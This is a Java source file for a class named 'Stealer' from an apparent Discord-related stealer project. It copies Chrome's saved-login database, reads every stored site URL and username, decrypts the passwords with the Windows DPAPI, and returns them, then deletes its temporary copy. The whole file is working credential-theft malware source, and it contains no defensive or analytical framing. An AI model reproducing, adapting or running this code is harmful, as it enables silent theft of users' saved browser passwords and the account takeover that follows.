package me.mafrans.discordsw.stealer;

import com.sun.jna.platform.win32.Crypt32Util;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Lemon on 8/26/2017.
 */
public class Stealer
{
    private static String db = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data";

    private static Connection connect() throws SQLException, ClassNotFoundException, IOException
    {
            String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
            if(!new File(dbLocation).exists())
            {
               Files.copy(Paths.get(db), Paths.get(dbLocation));
            }
            Class.forName("org.sqlite.JDBC");
            String url = "jdbc:sqlite:" + dbLocation;
            return DriverManager.getConnection(url);
    }

    public static  List<Data> steal()
    {
        try
        {
           Connection connection =  connect();
           Statement st = connection.createStatement();
           ResultSet set = st.executeQuery("SELECT * FROM logins");
           List<Data> data = new ArrayList<>();
           while(set.next())
           {
               String siteURL = set.getString("action_url");
               String username = set.getString("username_value");
               byte[] passwordBlob = set.getBytes("password_value");
               byte[] decryptedBlob = Crypt32Util.cryptUnprotectData(passwordBlob);
               String password = new String(decryptedBlob, "UTF-8");
               Data dt = new Data(siteURL, username, password);
               data.add(dt);

           }
           connection.close();
           Files.delete(Paths.get(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data"));
           return data;
        }
        catch(SQLException | ClassNotFoundException | IOException ex)
        {
            return new ArrayList<>();
        }
    }
}
